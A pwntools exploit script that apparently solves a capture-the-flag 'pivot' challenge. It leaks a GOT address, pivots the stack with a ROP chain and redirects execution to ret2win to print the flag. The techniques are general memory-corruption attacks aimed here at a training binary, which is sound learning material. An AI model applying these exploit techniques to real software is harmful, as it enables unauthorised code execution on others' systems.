from pwn import *

elf = context.binary = ELF('./pivot', checksec=False)
p = process()

rop = ROP(elf)

pivot_addr = int(re.search(r"(0x[\w\d]+)", p.recvS()).group(0), 16)

foothold_offset = 0x96a
ret2win_offset = 0xa81

# Our stack pivot
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]

xchg_rax_esp = elf.symbols.usefulGadgets + 2
# Need to call foothold_plt to populate GOT with function address
rop.call(elf.plt.foothold_function)
# Then call puts to leak the foothold_got address
rop.call(elf.plt.puts, [elf.got.foothold_function])
# Then return to main
rop.call(elf.symbols.main)

# Send payload 1 to leak the address
p.sendline(rop.chain())

# Our second payload to pivot to address we were given at beginning (where our payload 1 was injected)
rop = ROP(elf)
rop.raw([pop_rax, pivot_addr, xchg_rax_esp])

p.sendlineafter('>', flat({40: rop.chain()}))

# Receive text until beginning of leaked address
p.recvuntil("libpivot\n")
# Extract and convert leaked address
leaked_got_addresses = p.recv()
foothold_leak = unpack(leaked_got_addresses[:6].ljust(8, b"\x00"))
# Calculate offset to ret2win function
libpivot32_base = foothold_leak - foothold_offset
ret2win_addr = libpivot32_base + ret2win_offset

p.sendline(flat({40: ret2win_addr}))
p.recvuntil('Thank you!\n')

flag = p.recv()
print(flag)